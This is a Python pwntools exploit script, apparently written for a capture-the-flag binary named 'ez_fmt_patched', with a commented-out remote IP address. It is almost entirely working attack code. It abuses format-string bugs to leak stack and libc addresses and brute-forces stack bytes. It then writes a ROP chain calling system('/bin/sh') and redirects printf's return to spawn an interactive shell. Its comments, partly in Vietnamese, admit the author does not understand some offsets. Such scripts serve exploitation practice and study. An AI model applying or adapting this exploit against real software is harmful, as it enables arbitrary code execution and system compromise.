from pwn import *

r = process('./ez_fmt_patched')
# r = remote('192.81.209.60', 2022)
bin = ELF('./ez_fmt_patched')
libc = ELF('./libc.so.6')


def debug():
    gdb.attach(r, '''b*main+112''')

# debug()

################## LEAK 2 last bytes of addr of offset 22 #################
context.log_level='debug'
r.sendlineafter(b'Service :##\n', b'%21$cmmm')
last_byte = (r.recvline()[0] - 0x158) & 0xff   #leak 2 bytes of offset 0x80. Nhưng tại sao lại phải trừ cộng như kia?
log.success(f"Last_byte = {hex(last_byte)}")

guess_two_byte = 0
for i in range(0, 0x100, 3):
    guess_two_byte = last_byte + 0x300 * i#Guessing 2 bytes adjacent of address of stack with jump = 3
    payload = f'%{guess_two_byte+0x20}c%21$hnmmm'.encode() # ??? Why =0x20? because Làm tròn :))
    r.sendline(payload)
    payload = '%49c%49$hhnmmm'.encode() #Write 0x31 byte to offset 0x78:21, 0xf0:36 and 0x158:49
    r.sendlineafter(b'mmm\n', payload)
    r.sendlineafter(b'mmm\n', b'%10$c%42$c%74$cmmm') #Leak byte at offset 10, 42, 74
    recv = r.recvuntil(b'mmm\n')
    if recv[0] == 49:  #0x20
        log.success("Breaking by 10")
        debug()
        break
    if recv[1] == 49: #offset 0x120
        log.success("Breaking by 42")
        guess_two_byte -= 0x100  #sub to equal byte of address
        debug()
        break
    if recv[2] == 49: #offset 0x0220
        log.success("Breaking by 74") 
        guess_two_byte -= 0x200  #sub to same 2 last bytes of addr
        debug()
        break

log.success('Guess: %#x' % guess_two_byte)   #Guess ra offset cua input
# Bằng 1 cashc thần kì nào đó thì offet tôi leak ra lại là offset thứ 22 :))
payload = f'%{guess_two_byte-8}c%21$hnmmm'.encode()
# guess_two_byte-8 == 0x55b97bbdc336 <main+85>:    cmp    eax,0xffffffff : to skip restricted func
r.sendline(payload)
# Và bằng 1 cách thần kỳ nào đó thì nó lại quay trở về offset 21 :)))?

payload = f'%{guess_two_byte+8}c%37$hnmmm'.encode() #offset37: 0xf8
r.sendlineafter(b'mmm\n', payload)
# guess_two_byte+8 == địa chỉ đằng sau input

val = int.from_bytes(b'p', 'little') - 0x45
payload = f'%{0x45}c%49$hhn%{val}c%51$hhnmmm'.encode()
    #overwrite 0x45 to offset: 0x158: 0x7ffda88375e8 —▸ 0x7ffda8837488 —▸ 0x565310ff3336 (main+85) ◂— cmp eax, -1
    # write p to string inputed.
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'mmm\n')
r.recv(0x45)
stack = int(r.recv(14), 16) + 8
log.success('Stack: %#x' % stack)
########################

payload = f'%{guess_two_byte+6}c%37$hnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)

val = int.from_bytes(b'9$p', 'little') - 0x45
payload = f'%{0x45}c%10$hhn%{val}c%51$nmmm'.encode().ljust(0x20, b'\0') + p64(stack-8)
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'0x')

libc.address = int(r.recv(12), 16) - 0x240b3
log.success('Libc base: %#x' % libc.address)

pop_rdi_ret = 0x0000000000023b72
ret = 0x000000000005634f
add_rsp_0x68_ret = 0x000000000010e4fc

r.sendline(b'mmm')
def write(addr, value):
    for i in range(3):
        val = (value >> (16 * i)) & 0xffff
        payload = f'%{val}c%10$hnmmm'.encode().ljust(0x20, b'\0') + p64(addr + (i*2))
        r.sendlineafter(b'mmm', payload)

    payload = f'%10$hnmmm'.encode().ljust(0x20, b'\0') + p64(addr + 6)
    r.sendlineafter(b'mmm', payload)

write(stack+0x68, libc.address+pop_rdi_ret)
log.success("OKE")
write(stack+0x70, next(libc.search(b'/bin/sh')))
log.success("OKE")
write(stack+0x78, libc.address+ret)
log.success("OKE")
write(stack+0x80, libc.symbols['system'])
log.success("OKE")

def gen_payload(l):
    payload = ''
    sum = 0
    value = 0
    for i in l:
        if i[1] == 'hhn':
            if i[0] < (sum & 0xff):
                value = (i[0] - (sum & 0xff)) + 0x100
            else:
                value = i[0] - (sum & 0xff)
        elif i[1] == 'hn':
            if i[0] < (sum & 0xffff):
                value = (i[0] - (sum & 0xffff)) + 0x10000
            else:
                value = i[0] - (sum & 0xffff)
        elif i[1] == 'n':
            if i[0] < (sum & 0xffffffff):
                value = (i[0] - (sum & 0xffffffff)) + 0x100000000
            else:
                value = i[0] - (sum & 0xffffffff)

        sum += value
        payload += f'%{value}c%{i[2]}$' + i[1]

    return payload.encode()
#Sử dụng kỹ thuật thay đổi return address của printf, để nó nhảy tới đoạn ROP add rsp, 0x68; ret,
# lúc này rsp sẽ nhảy tới đúng đoạn ROP system("/bin/sh")
addr = libc.address + add_rsp_0x68_ret
part1 = addr & 0xffff
part2 = (addr >> 16) & 0xffff
part3 = (addr >> 32) & 0xffff
payload = gen_payload([[part1, 'hn', 12], [part2, 'hn', 13], [part3, 'hn', 14]])
payload = payload.ljust(0x30, b'\0') + p64(stack-8) + p64(stack-6) + p64(stack-4)
r.sendlineafter(b'mmm', payload)
r.interactive()